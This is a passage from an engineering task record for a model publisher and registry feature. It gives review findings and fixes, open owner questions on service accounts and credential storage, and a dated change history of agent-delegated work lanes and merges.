- **Not yet done:** the cluster proof (plan §Verification 5): build + promote the image with `model-publisher.main.js`, re-run `minio-bootstrap` (delete rights), push `task-1019/model-publisher` to the deployment repo, then repeat the flow against `hope-models` through the s3fs mount.

### Final review (opus) — outcome
3 Critical + 8 Important findings, all fixed (see Change History); the fix pass itself surfaced two more defects (gateway boot contract, worker DI), both fixed. Deferred minors are listed under Follow-ups.

### Open owner questions
- **OQ-1 Service accounts on the registry.** The registry routes accept only a human platform admin (as model residency does). The bootstrap script therefore keeps the out-of-band Job for an empty cluster. Should a platform-tier service account (no working tenant, `svc:admin:ai-model:manage`) count as a platform admin here, so bootstrap can call `download-missing`?
- **OQ-2 Publisher credential home.** The publisher key pair is an env-tier secret delivered by `secretKeyRef` to the publisher pod alone (Vault kv would expose it to hope-api's shared AppRole). A publisher-only Vault AppRole would bring it back into Vault — follow-up or accept?

## Change History

| Date | Change |
|---|---|
| 2026-09-29 | Review of requirements 1–5 (three read-only discovery agents; key claims re-verified by hand: probe fallback + caller `baseUrl`, `hope-platform-rw` has no `hope-models` rights, no default retention). Plan written; owner resolved OD-1…OD-6 with "go with your recommendations". Status Pending — awaiting go. |
| 2026-09-29 | Owner said go. Renumbered **TASK-1016 → TASK-1019**: a peer session had already merged a different TASK-1016 (text callers name provider and model, `628979ba4`), TASK-1017 is taken, and a peer deployment worktree is named `task-1018`. Status In Progress. |
| 2026-09-29 | Lane S (probe leak) landed inline (`e3755123a`). Owner asked mid-run for tiered agents: remaining lanes delegated — P opus, R opus, Y sonnet, C sonnet, D sonnet — in worktrees `../hope-v2-task-1019-{pub,reg,res,con}` and `../hope-v2-deployment-task-1019`. Shared contract committed first (`e6150f5e5`: `publisher-job.contract.ts`, `lifecycle/model-lifecycle.types.ts`). Rulings: `ai-model-download.service.ts` moved to Lane R (it is the producer); lifecycle types live in `@arcaai/applications`, not `@arcaai/types`; multipart via `@aws-sdk/client-s3` commands (no new dependency — `pnpm install` is unsafe in worktrees). |
| 2026-09-29 | Lanes merged into `task-1019/model-registry`: Y (`2c8ff0530`), C (`49c6424dd`), P (`c3a88cbf8`), R (`978ee8173`); orchestrator: env surface (`c17c63ed6`), console proxy platform-wide except `catalogue` (`e92825f5d`), `dev-2.2` merged in (`79f20dedd`, resolved the TASK-1015 `runJobInContext` conflict in the processor), artifacts regenerated (`8daa16dd2`), old controller test arity (`321850115`). |
| 2026-09-29 | Final review (opus): not ready — C1 lifecycle never injected; C2 probe bypass with `apiKey: null`/whitespace; C3 publisher key pair unreadable under `SECRETS_PROVIDER=vault`; I4 unregister stuck on a non-retryable error; I5 service accounts refused (bootstrap); I6 download-missing ignored UNKNOWN; I7 time-based liveness; I8 staging pre-flight measured node disk; I9 referrers not re-checked in the worker; I10 stale window shorter than retry backoff; I11 heartbeat bumps `_version` (drawer 412). Fix pass B (opus, `217d125eb`): C1, C2, I6, I10a, I11 (+ start-download refresh `2ff2eeb8e`). Fix pass A (opus, `18eccaac0`): C3 (env-tier secret, publisher pod only), I4, I7, I8, I9, I10b. I5 ruled: no service accounts (OQ-1); bootstrap keeps the Job (deployment `11263b8`, `bf4f40e`). Post-fix gate caught two more: the publisher pair entered the gateway boot contract (`1cf8c4823`, `READ_BY_MODEL_PUBLISHER_ONLY`) and the worker lacked `BlobStorageModule` at its root (`883cd346b`, proven by a boot against unreachable infra). Status Review. |
| 2026-09-29 | Owner: "merge to dev-2.2 and do the live proof". Synced `dev-2.2` twice (TASK-1020 migration + artifacts: regenerated with no drift; gate on the synced tree green — applications 15 580, api 4 677, console 3 812 tests; one prettier error fixed `f6106a301`), merged `ee59d13d5` (tree identical to the gated branch). Live proof on the local stack (see Evidence); one defect found and fixed (`94452b2e4`). Status Review — cluster rollout pending. |
